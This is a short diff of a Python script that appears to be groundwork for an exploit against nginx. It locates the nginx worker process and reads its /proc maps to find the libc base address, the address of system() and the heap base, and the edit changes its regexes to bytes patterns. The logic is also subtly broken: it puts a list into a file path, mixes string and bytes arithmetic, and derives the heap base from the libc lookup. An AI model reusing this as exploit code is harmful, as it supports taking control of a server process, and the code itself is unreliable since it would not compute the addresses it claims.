@@ -21,14 +21,14 @@ except subprocess.CalledProcessError:
     print("[*] Run Nginx Server !...")
     nginx_process = subprocess.check_output("pgrep -a nginx", shell=True)
 finally:
-    nginx_worker_process = re.findall(r'\d+', nginx_process)
+    nginx_worker_process = re.findall(rb'\d+', nginx_process)
     print(nginx_worker_process[-1])
 
 # Determine the LIBC_BASE address
 list_libc_base_addr = subprocess.check_output(
     f"grep 'libc\.so' /proc/{nginx_worker_process}/maps", shell=True
     )
-LIBC_BASE = re.search(r'^([0-9a-f]+)-', list_libc_base_addr).group(1)
+LIBC_BASE = re.search(rb'^([0-9a-f]+)-', list_libc_base_addr).group(1)
 LIBC_BASE = f"0x{LIBC_BASE}"
 # Determine the SYSTEM_ADDR
 system_offset = subprocess.check_output(
@@ -38,7 +38,7 @@ system_offset = subprocess.check_output(
 SYSTEM_ADDR = LIBC_BASE + system_offset
 # Determine the HEAP_BASE
 HEAP_BASE = subprocess.check_output(f"grep '\[heap\]' /proc/{nginx_worker_process}/maps", shell=True)
-HEAP_BASE = re.search(r'^([0-9a-f]+)-', list_libc_base_addr).group(1)
+HEAP_BASE = re.search(rb'^([0-9a-f]+)-', list_libc_base_addr).group(1)
 HEAP_BASE = f"{HEAP_BASE}"
 
 print(LIBC_BASE, SYSTEM_ADDR, HEAP_BASE)
